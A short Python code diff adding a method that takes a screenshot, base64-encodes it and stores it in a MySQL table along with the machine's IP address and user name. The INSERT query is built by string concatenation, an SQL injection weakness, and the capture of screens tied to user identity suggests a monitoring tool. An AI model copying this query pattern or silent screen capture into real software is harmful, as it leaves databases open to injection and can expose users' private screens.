@@ -1,5 +1,6 @@
 import pymysql
 import ip
+import screenshot as screen
 
 class Database:
 
@@ -23,4 +24,13 @@ class Database:
         self.conexao.commit()
         
         # Finaliza a conexão
+        self.conexao.close()
+
+    def insert_print(self):
+        screenPrint = screen.Screenshot()
+        getImg = screenPrint.img_base64()
+
+        self.cursor.execute('INSERT INTO dados (ip, user, imagem) VALUES ("' + self.getIP + '","' + self.getUser + '","' + getImg + '")')
+        
+        self.conexao.commit()
         self.conexao.close()
